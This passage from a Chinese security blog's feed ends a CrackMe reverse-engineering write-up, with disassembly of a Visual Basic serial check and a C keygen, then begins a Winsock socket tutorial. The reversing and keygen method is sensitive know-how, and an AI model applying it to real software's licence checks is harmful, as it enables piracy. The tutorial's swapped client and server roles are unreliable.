<span class="hljs-number">01000</span>&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x64],<span class="hljs-number">0</span>x1<br><span class="hljs-symbol">00402149 </span>  . |<span class="hljs-number">895</span>D <span class="hljs-number">94</span>       mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C],ebx<br><span class="hljs-number">0040214</span>C   . |FF15 <span class="hljs-number">90414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaI4Var&gt;;  Msvbvm50.__vbaI4Var<br><span class="hljs-symbol">00402152 </span>  . |<span class="hljs-number">8D4</span>D BC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x44]          ; |<br><span class="hljs-symbol">00402155 </span>  . |<span class="hljs-number">50</span>            push eax                                 ; |Start = <span class="hljs-number">0</span>x18F3CC<br><span class="hljs-symbol">00402156 </span>  . |<span class="hljs-number">8D55</span> <span class="hljs-number">84</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]          ; |<br><span class="hljs-symbol">00402159 </span>  . |<span class="hljs-number">51</span>            push ecx                                 ; |dString8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040215</span>A   . |<span class="hljs-number">52</span>            push edx                                 ; |RetBUFFER = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">0040215</span>B   . |FF15 <span class="hljs-number">38414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">632</span>&gt;]     ; \获取每一位<br><span class="hljs-symbol">00402161 </span>  . |<span class="hljs-number">8D45</span> <span class="hljs-number">84</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]<br><span class="hljs-symbol">00402164 </span>  . |<span class="hljs-number">8D4</span>D A8       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x58]<br><span class="hljs-symbol">00402167 </span>  . |<span class="hljs-number">50</span>            push eax                                 ; /String8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402168 </span>  . |<span class="hljs-number">51</span>            push ecx                                 ; |ARG2 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-symbol">00402169 </span>  . |FF15 <span class="hljs-number">70414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrVa&gt;; \__vbaStrVarVal<br><span class="hljs-number">0040216</span>F   . |<span class="hljs-number">50</span>            push eax                                 ; /String = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-symbol">00402170 </span>  . |FF15 <span class="hljs-number">0</span>C414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">516</span>&gt;]     ; \转为ascii<br><span class="hljs-symbol">00402176 </span>  . |<span class="hljs-number">66</span>:<span class="hljs-number">8985</span> <span class="hljs-number">4</span>CFFF&gt;mov word ptr ss:[ebp-<span class="hljs-number">0</span>xB4],ax<br><span class="hljs-number">0040217</span>D   . |<span class="hljs-number">8D55</span> CC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-symbol">00402180 </span>  . |<span class="hljs-number">8D85</span> <span class="hljs-number">44</span>FFFFFF lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC]<br><span class="hljs-symbol">00402186 </span>  . |<span class="hljs-number">52</span>            push edx                                 ; /var18 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-symbol">00402187 </span>  . |<span class="hljs-number">8D8</span>D <span class="hljs-number">74</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x8C]          ; |<br><span class="hljs-number">0040218</span>D   . |<span class="hljs-number">50</span>            push eax                                 ; |var28 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">0040218</span>E   . |<span class="hljs-number">51</span>            push ecx                                 ; |saveto8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040218</span>F   . |<span class="hljs-number">899</span>D <span class="hljs-number">44</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC],ebx          ; |<br><span class="hljs-symbol">00402195 </span>  . |FF15 <span class="hljs-number">94414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarAd&gt;; \相加<br><span class="hljs-number">0040219</span>B   . |<span class="hljs-number">8</span>BD0          mov edx,eax<br><span class="hljs-number">0040219</span>D   . |<span class="hljs-number">8D4</span>D CC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-number">004021</span>A0   . |FFD6          <span class="hljs-keyword">call</span> esi                                 ;  Msvbvm50.__vbaVarMove<br><span class="hljs-number">004021</span>A2   . |<span class="hljs-number">8D4</span>D A8       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x58]<br><span class="hljs-number">004021</span>A5   . |FF15 B8414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  Msvbvm50.__vbaFreeStr<br><span class="hljs-number">004021</span>AB   . |<span class="hljs-number">8D55</span> <span class="hljs-number">84</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]<br><span class="hljs-number">004021</span>AE   . |<span class="hljs-number">8D45</span> <span class="hljs-number">94</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]<br><span class="hljs-number">004021</span>B1   . |<span class="hljs-number">52</span>            push edx<br><span class="hljs-number">004021</span>B2   . |<span class="hljs-number">50</span>            push eax<br><span class="hljs-number">004021</span>B3   . |<span class="hljs-number">53</span>            push ebx<br><span class="hljs-number">004021</span>B4   . |FFD7          <span class="hljs-keyword">call</span> edi                                 ;  Msvbvm50.__vbaFreeVarList<br><span class="hljs-number">004021</span>B6   . |<span class="hljs-number">83</span>C4 <span class="hljs-number">0</span>C       add esp,<span class="hljs-number">0</span>xC<br><span class="hljs-number">004021</span>B9   . |<span class="hljs-number">8D8</span>D E8FEFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x118]<br><span class="hljs-number">004021</span>BF   . |<span class="hljs-number">8D95</span> F8FEFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x108]<br><span class="hljs-number">004021</span>C5   . |<span class="hljs-number">8D45</span> DC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]<br><span class="hljs-number">004021</span>C8   . |<span class="hljs-number">51</span>            push ecx                                 ; /TMPend8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">004021</span>C9   . |<span class="hljs-number">52</span>            push edx                                 ; |TMPstep8 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">004021</span>CA   . |<span class="hljs-number">50</span>            push eax                                 ; |Counter8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">004021</span>CB   . |FF15 AC414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \__vbaVarForNext<br><span class="hljs-number">004021D1</span>   .^|E9 <span class="hljs-number">5</span>CFFFFFF   jmp Andréna.<span class="hljs-number">00402132</span><br></code></pre></div></td></tr></table></figure><p>然后所有name相加的结果乘以0x499602D2</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">004021D6   &gt; \8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>004021D9   .  8D95 54FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>]<br>004021DF   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; /var18 = 0018F404</span><br>004021E0   .  8D45 <span class="hljs-number">94</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>]          <span class="hljs-comment">; |</span><br>004021E3   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |var28 = 0018F38C</span><br>004021E4   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |SaveTo8 = 0018F3CC</span><br>004021E5   .  C785 5CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xA4</span>],<span class="hljs-number">0x499602D2</span>   <span class="hljs-comment">; |</span><br>004021EF   .  C785 54FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>],<span class="hljs-number">0x3</span>          <span class="hljs-comment">; |</span><br>004021F9   .  FF15 5C414000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaVarMu&gt;<span class="hljs-comment">; \__vbaVarMul</span><br></code></pre></div></td></tr></table></figure><p>这个值再转为十进制的字符串。</p><p>可以看到这个值和计算器计算出来的是一样的。</p><p><img src="/2021/08/09/160CrackMe-009/5.png"></p><p><img src="/2021/08/09/160CrackMe-009/6.png"></p><p>最后就是使用“-”替换到第四位和第九位的字符。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402206 </span>  .  <span class="hljs-number">8</span>B1D A0414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaMi&gt;;  Msvbvm50.__vbaMidStmtVar<br><span class="hljs-number">0040220</span>C   .  <span class="hljs-number">8D4</span>D CC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-number">0040220</span>F   .  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-symbol">00402210 </span>  .  <span class="hljs-number">6</span>A <span class="hljs-number">04</span>         push <span class="hljs-number">0</span>x4<br><span class="hljs-symbol">00402212 </span>  .  <span class="hljs-number">8D95</span> <span class="hljs-number">54</span>FFFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC]<br><span class="hljs-symbol">00402218 </span>  .  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x1<br><span class="hljs-number">0040221</span>A   .  <span class="hljs-number">52</span>            push edx<br><span class="hljs-number">0040221</span>B   .  C785 <span class="hljs-number">5</span>CFFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xA4],Andréna.<span class="hljs-number">0040</span>&gt;;  -<br><span class="hljs-symbol">00402225 </span>  .  C785 <span class="hljs-number">54</span>FFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],<span class="hljs-number">0</span>x8<br><span class="hljs-number">0040222</span>F   .  FFD3          <span class="hljs-keyword">call</span> ebx                                 ;  &lt;&amp;MSVBVM50.__vbaMidStmtVar&gt;<br><span class="hljs-symbol">00402231 </span>  .  <span class="hljs-number">8D45</span> CC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-symbol">00402234 </span>  .  <span class="hljs-number">8D8</span>D <span class="hljs-number">54</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC]<br><span class="hljs-number">0040223</span>A   .  <span class="hljs-number">50</span>            push eax<br><span class="hljs-number">0040223</span>B   .  <span class="hljs-number">6</span>A <span class="hljs-number">09</span>         push <span class="hljs-number">0</span>x9<br><span class="hljs-number">0040223</span>D   .  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x1<br><span class="hljs-number">0040223</span>F   .  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-symbol">00402240 </span>  .  C785 <span class="hljs-number">5</span>CFFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xA4],Andréna.<span class="hljs-number">0040</span>&gt;;  -<br><span class="hljs-number">0040224</span>A   .  C785 <span class="hljs-number">54</span>FFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],<span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00402254 </span>  .  FFD3          <span class="hljs-keyword">call</span> ebx<br></code></pre></div></td></tr></table></figure><p>下面开始编写注册机</p><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><p>根据以上分析的结果</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br><span class="hljs-built_in">gets_s</span>(name);<br><span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> key = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br>key += name[i];<br>&#125;<br>key *= <span class="hljs-number">0x499602D2</span>;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">30</span>];<br><span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%lld&quot;</span>, key);<br>buf[<span class="hljs-number">3</span>] = <span class="hljs-string">&#x27;-&#x27;</span>;<br>buf[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;-&#x27;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;你的key是：\n%s&quot;</span>, buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/09/160CrackMe-009/7.png"></p><p><img src="/2021/08/09/160CrackMe-009/8.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>分析起来不难，主要是VB的特性让人很折磨。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这个VB的程序，调用的时候都是传入一个地址，然后地址直接查看是什么也看不到，没有什么有用的，分析起来看得人一头雾水。查了资料之后才知道，VB</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ackie.cn/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ackie.cn/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>传输技术-SOCKET通信</title>
    <link href="https://b1ackie.cn/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/"/>
    <id>https://b1ackie.cn/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/</id>
    <published>2021-08-06T11:35:59.000Z</published>
    <updated>2021-08-09T10:51:36.524Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SOCKET通信"><a href="#SOCKET通信" class="headerlink" title="SOCKET通信"></a>SOCKET通信</h3><p>socket也被叫做“套接字”，应用程序通常通过“套接字”向网络发出请求或者接收请求。socket表示是：IP地址加上端口号，如127.0.0.1:8080。Socket编程有两种通信协议可以选择，一种是TCP，另一种是UDP。先来说一下基于TCP的Socket编程。</p><h4 id="基于TCP-Socket编程"><a href="#基于TCP-Socket编程" class="headerlink" title="基于TCP Socket编程"></a>基于TCP Socket编程</h4><p>TCP是一种基于连接的协议，在进行通信之前，必须要建立连接，其中服务端监听请求，客户端发送请求。当建立好了连接之后，就可以开始通信了。</p><h5 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h5><h6 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h6><p>根据指定的地址族、数据类型和协议来分配一个套接口的描述字及其所有资源的函数。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">SOCKET <span class="hljs-title">socket</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_ <span class="hljs-keyword">int</span> af,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_ <span class="hljs-keyword">int</span> type,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_ <span class="hljs-keyword">int</span> protocol)</span></span>;<br></code></pre></div></td></tr></table></figure><p>af：指定地址族规范。地址系列的可能值在Winsock2.h头文件中定义。当前支持AF_INET或者AF_INET6，它们是IPV4和IPV6的互联网地址族格式。</p><p>type：指定socket类型，SOCK_STREAM类型指定产生流式套接字，SOCK_DGRAM类型指定产生数据报式套接字，而SOCK_RAW类型指定产生原始套接字（只有管理员权限的用户可以创建原始套接字）。</p><p>protocol：与特定地址家族相关的协议IPPROTO_TCP、IPPROTO_UP、IPPROTO_IP，如果指定为0，那么系统会根据地址格式和套接字类别，自动选择一个合适的协议。</p><p>返回值：如果没有发生错误，则套接字返回引用新套接字的描述符，否则返回INVALID_SOCKET。</p><h6 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h6><p>将本地地址与套接字相关联</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim"><span class="hljs-built_in">int</span> <span class="hljs-keyword">bind</span>(<br>  <span class="hljs-type">SOCKET</span>         s,<br>  <span class="hljs-keyword">const</span> sockaddr *<span class="hljs-keyword">addr</span>,<br>  <span class="hljs-built_in">int</span>            namelen<br>);<br></code></pre></div></td></tr></table></figure><p>s：标识未绑定套接字的描述符。</p><p>addr：指向要分配给绑定套接字的本地地址的sockaddr结构的指针。</p><p>namelen：name参数指向值的长度。</p><p>返回值：如果没有发生错误，则bind返回0，否则返回SOCKET_ERROR。</p><h6 id="htons"><a href="#htons" class="headerlink" title="htons"></a>htons</h6><p>将整型变量从主机字节顺序转变成网络字节顺序，就是整数在地址空间中的存储方式变为高位字节存放在内存的低地址处。</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">u_short htons(<br>  u_short hostshort<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hostshort：指定主机字节顺序为16位。</p><p>返回值：返回TCP/IP网络字节顺序。</p><h6 id="inet-addr"><a href="#inet-addr" class="headerlink" title="inet_addr"></a>inet_addr</h6><p>将一个点分十进制的IP转换成一个长整型数。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">inet_addr</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cp</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>返回值：如果没有发生错误，返回一个无符号长整型值，其中包含给定互联网地址的适当的二进制表示形式。</p><h6 id="listen函数"><a href="#listen函数" class="headerlink" title="listen函数"></a>listen函数</h6><p>将一个套接字置于正在监听传入连接的状态。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">listen</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ SOCKET s,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ <span class="hljs-keyword">int</span> backlog)</span></span>;<br></code></pre></div></td></tr></table></figure><p>s：标识绑定的未连接套接字的描述符。</p><p>backlog：指定待连接队列的最大长度。如果设置为SOMAXCONN，则负责套接字的底层服务提供商将积压设置为最大合理值。如果设置为SOMAXCONN_HINT(N)（其中N是数字），则积压值为N，调整范围（200,65535）。</p><p>返回值：如没有发生错误，返回0，否则返回SOCKET_ERROR。</p><h6 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h6><p>允许在套接字上尝试连接</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">SOCKET accept (<br>      _In_ SOCKET s,<br>      <span class="hljs-constructor">_Out_writes_bytes_opt_(<span class="hljs-operator">*</span><span class="hljs-params">addrlen</span>)</span> <span class="hljs-keyword">struct</span> sockaddr FAR *addr,<br>      _Inout_opt_ <span class="hljs-built_in">int</span> FAR *addrlen);<br></code></pre></div></td></tr></table></figure><p>s：描述符，用于标识使用listen功能并处于侦听状态的套接字。连接实际上是由accept返回的套接字。</p><p>addr：指定一个可选缓冲区的指针，它接受通信层中已知连接实体的地址。addr参数的确切格式由创建sockaddr结构的套接字时建立的地址族来确定。</p><p>addrlen：指向一个整数的可选指针，其中包含由addr参数指向的结构长度。</p><p>返回值：如果没有发生错误，则accept返回一个SOCKET类型的值，该值是新套接字的描述符。此返回值是实际连接所在的套接字的句柄。否则返回INVALID_SOCKET。</p><h6 id="send"><a href="#send" class="headerlink" title="send"></a>send</h6><p>在建立连接的套接字上发送数据</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">send</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ SOCKET s,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_reads_bytes_(len) <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> FAR * buf,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ <span class="hljs-keyword">int</span> len,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ <span class="hljs-keyword">int</span> flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>s：标识连接的套接字的描述符。</p><p>buf：指向要发送的数据缓冲区的指针。</p><p>len：由buf参数指向缓冲区中数据的长度。</p><p>flags：指定一组调用方式的标志，一般置为0。</p><p>返回值：如果没有发生错误，返回发送的字节数，否则返回SOCKET_ERROR。</p><h6 id="recv"><a href="#recv" class="headerlink" title="recv"></a>recv</h6><p>从连接的套接字或绑定的无连接套接字中接收数据。</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> recv (<br>    _In_ SOCKET s,<br>    <span class="hljs-constructor">_Out_writes_bytes_to_(<span class="hljs-params">len</span>, <span class="hljs-params">return</span>)</span> <span class="hljs-constructor">__out_data_source(NETWORK)</span> <span class="hljs-built_in">char</span> FAR<span class="hljs-operator"> * </span>buf,<br>    _In_ <span class="hljs-built_in">int</span> len,<br>    _In_ <span class="hljs-built_in">int</span> flags);<br></code></pre></div></td></tr></table></figure><p>s：标识连接的套接字的描述符。</p><p>buf：指向缓冲区的指针，用于接收传入的数据。</p><p>len：由buf参数指向缓冲区中数据的长度。</p><p>flags：指定一组调用方式的标志，一般置为0。</p><p>返回值，如果没有发生错误，则recv返回接收到的字节数，由buf参数指向的缓冲区将包含接收到的数据。如果连接已经正常关闭，则返回值为0.</p><h5 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h5><p>客户端先初始化winsock环境，然后调用Socket函数创建套接字，然后进行结构体的设置，调用bind函数绑定，再调用listen函数进行监听。当有连接请求时，调用accept函数接收连接请求。建立连接后，使用recv和send函数进行通信。</p><p>服务端先初始化winsock环境，然后调用Socket函数创建套接字，然后进行结构体的设置，然后调用connect函数发送连接请求，建立连接后，使用recv和send函数进行通信。</p><h6 id="服务端代码："><a href="#服务端代码：" class="headerlink" title="服务端代码："></a>服务端代码：</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span 